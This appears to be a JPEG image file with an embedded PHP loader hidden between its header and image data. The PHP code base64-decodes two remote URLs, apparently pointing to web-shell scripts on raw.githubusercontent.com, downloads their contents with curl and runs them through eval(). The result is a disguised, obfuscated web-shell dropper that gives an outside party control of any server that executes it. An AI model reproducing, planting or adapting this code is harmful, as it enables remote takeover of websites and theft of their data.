���� JFIF      ��

<?php
function get($url) {
    $ch = curl_init();

    curl_setopt($ch, CURLOPT_HEADER, true);
    curl_setopt($ch, CURLOPT_NOBODY, true);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); 
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true); 
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE); 

    if ($http_code == 200) {
        curl_setopt($ch, CURLOPT_NOBODY, false);
        curl_setopt($ch, CURLOPT_HEADER, false);
        $data = curl_exec($ch);
        curl_close($ch);
        return $data;
    } else {
        curl_close($ch);
        return false;
    }
}

$x = '?>';
$url1 = base64_decode('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL1hKMzAzL3dvZmxzaGVsbC9yZWZzL2hlYWRzL21haW4vbWFpbi5waHA');
$url2 = base64_decode('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2V4ZWN1dGl2ZW11ZGEvc2VrYXJhL21haW4vY29kZS9tYWluL3dzL3dzLnR4dA');

$script1 = get($url1);
if ($script1 !== false && $script1 !== 404) {
    eval($x . $script1);
} else {
    $script2 = get($url2);
    if ($script2 !== false) {
        eval($x . $script2);
    } else {
        echo "Both attempts failed.";
    }
}
?>





			

		


�� C	��    ��               �� "          #Qr��               �� &         1! A"2qQa���   ? �y,�/3J�ݹ�߲؋5�Xw���y�R��I0�2�PI�I��iM����r�N&"KgX:����nTJnLK��@!�-����m�;�g���&�hw���@�ܗ9�-�.�1<y����Q�U�ہ?.����b߱�֫�w*V��) `$��b�ԟ��X�-�T��G�3�g ����Jx���U/��v_s(H� @T�J����n��!�gfb�c�:�l[�Qe9�PLb��C�m[5��'�jgl���_���l-;"Pk���Q�_�^�S�  x?"���Y騐�O�	q�`~~�t�U�Cڒ�V		I1��_��
